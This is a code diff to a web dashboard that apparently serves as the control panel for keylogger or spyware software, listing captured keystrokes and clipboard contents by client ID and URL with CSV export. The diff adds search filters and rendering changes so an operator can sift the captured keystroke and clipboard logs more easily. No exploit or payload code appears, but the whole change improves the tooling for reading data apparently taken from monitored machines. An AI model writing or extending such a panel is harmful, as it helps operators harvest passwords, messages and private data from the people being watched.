@@ -500,6 +500,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="pnl">
         <div class="pnl-h">
             <h2>Keystrokes</h2>
+            <input id="keys-search" type="search" placeholder="Filter keystrokes…" oninput="filterKeystrokes()" style="font-size:.7rem;padding:4px 8px;border:1px solid var(--border2);border-radius:5px;background:var(--bg2);color:var(--text);width:180px">
             <button class="btn export" onclick="downloadKeystrokesCSV()" title="Download als CSV">⬇ CSV</button>
         </div>
         <div class="pnl-b np" id="key-log"><div class="empty">No keystrokes captured</div></div>
@@ -511,6 +512,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="pnl">
         <div class="pnl-h">
             <h2>Clipboard</h2>
+            <input id="clip-search" type="search" placeholder="Filter clipboard…" oninput="filterClipboard()" style="font-size:.7rem;padding:4px 8px;border:1px solid var(--border2);border-radius:5px;background:var(--bg2);color:var(--text);width:180px">
             <button class="btn export" onclick="downloadClipboardCSV()" title="Download als CSV">⬇ CSV</button>
         </div>
         <div class="pnl-b np" id="clip-log"><div class="empty">No clipboard data</div></div>
@@ -1494,11 +1496,22 @@ async function loadVideos() {
 let keysLimit = 100, clipLimit = 50, visitsLimit = 100;
 
 async function loadKeystrokes(reset) {
-    if (reset) keysLimit = 100;
+    if (reset) { keysLimit = 100; const s = $('#keys-search'); if (s) s.value = ''; }
     const keys = await api('/api/keystrokes?limit=' + keysLimit + filterParam());
     if (!keys) return;
+    window._lastKeys = keys;
+    renderKeystrokes(keys);
+}
+
+function filterKeystrokes() {
+    const q = ($('#keys-search')?.value || '').toLowerCase();
+    const data = window._lastKeys || [];
+    renderKeystrokes(q ? data.filter(k => (k.keys||'').toLowerCase().includes(q) || (k.url||'').toLowerCase().includes(q) || (k.clientId||'').toLowerCase().includes(q)) : data);
+}
+
+function renderKeystrokes(keys) {
     const c = $('#key-log');
-    if (!keys.length) { c.innerHTML = '<div class="empty">No keystrokes captured</div>'; return; }
+    if (!keys || !keys.length) { c.innerHTML = '<div class="empty">No keystrokes captured</div>'; return; }
     const rows = keys.map(k => {
         const highlighted = k.keys.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
@@ -1508,27 +1521,38 @@ async function loadKeystrokes(reset) {
             <div class="key-text">${highlighted}</div>
         </div>`;
     }).join('');
-    const loadMore = keys.length === keysLimit
+    const loadMore = (window._lastKeys || []).length === keysLimit
         ? `<div style="text-align:center;padding:14px"><button class="btn" onclick="keysLimit+=${100};loadKeystrokes()">Load more (${keysLimit}/${keysLimit} shown)</button></div>`
-        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${keys.length} entries shown</div>`;
+        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${(window._lastKeys||[]).length} entries shown</div>`;
     c.innerHTML = rows + loadMore;
 }
 
 async function loadClipboard(reset) {
-    if (reset) clipLimit = 50;
+    if (reset) { clipLimit = 50; const s = $('#clip-search'); if (s) s.value = ''; }
     const clips = await api('/api/clipboard?limit=' + clipLimit + filterParam());
     if (!clips) return;
+    window._lastClips = clips;
+    renderClipboard(clips);
+}
+
+function filterClipboard() {
+    const q = ($('#clip-search')?.value || '').toLowerCase();
+    const data = window._lastClips || [];
+    renderClipboard(q ? data.filter(c => (c.content||c.text||'').toLowerCase().includes(q) || (c.url||'').toLowerCase().includes(q) || (c.clientId||'').toLowerCase().includes(q)) : data);
+}
+
+function renderClipboard(clips) {
     const c = $('#clip-log');
-    if (!clips.length) { c.innerHTML = '<div class="empty">No clipboard data</div>'; return; }
+    if (!clips || !clips.length) { c.innerHTML = '<div class="empty">No clipboard data</div>'; return; }
     const rows = clips.map(cl => `
         <div class="clip-entry">
             <div class="clip-hdr"><span class="clip-id">${escHtml(cl.clientId)}</span><span class="clip-time">${fmtTime(cl.timestamp)}</span></div>
             <div class="clip-text">${escHtml(cl.content)}</div>
         </div>
     `).join('');
-    const loadMore = clips.length === clipLimit
+    const loadMore = (window._lastClips||[]).length === clipLimit
         ? `<div style="text-align:center;padding:14px"><button class="btn" onclick="clipLimit+=${50};loadClipboard()">Load more (${clipLimit}/${clipLimit} shown)</button></div>`
-        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${clips.length} entries shown</div>`;
+        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${(window._lastClips||[]).length} entries shown</div>`;
     c.innerHTML = rows + loadMore;
 }
 
